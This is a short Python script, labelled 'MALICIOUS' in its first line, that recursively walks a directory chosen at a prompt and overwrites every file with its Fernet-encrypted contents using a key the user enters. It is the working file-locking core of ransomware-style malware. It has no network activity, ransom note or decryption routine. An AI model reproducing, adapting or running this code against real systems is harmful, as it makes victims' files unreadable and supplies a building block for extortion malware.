# MALICIOUS


# Import 'Fernet', 'os', 'sys' and 'time' libraries
from cryptography.fernet import Fernet
import os, sys, time


# Encrypt files
def encryption():
    for dirpath, dirnames, filenames in os.walk(directory):
        for filename in filenames:
            file_name = os.path.join(dirpath, filename).replace("\\", "/")
            with open(file_name, "rb") as target:
                data = target.read()
            with open(file_name, "wb") as target:
                encrypted_data = use.encrypt(data)
                target.write(encrypted_data)
            print(file_name)


# Get directory to encrypt and store value in 'directory' (String)
directory = input("\nEnter directory: ")


# Get current working directory of script and store value in 'current_working_directory' (String)
current_working_directory = os.path.dirname(sys.argv[0])
current_working_directory = current_working_directory.replace("c:", "") + "/"


# Get and use master key. Store value in 'master_key'
try:
    master_key = input("\nEnter master key: ")
    use = Fernet(master_key)
    encryption()
except TypeError:
    print("\nInvalid input.")
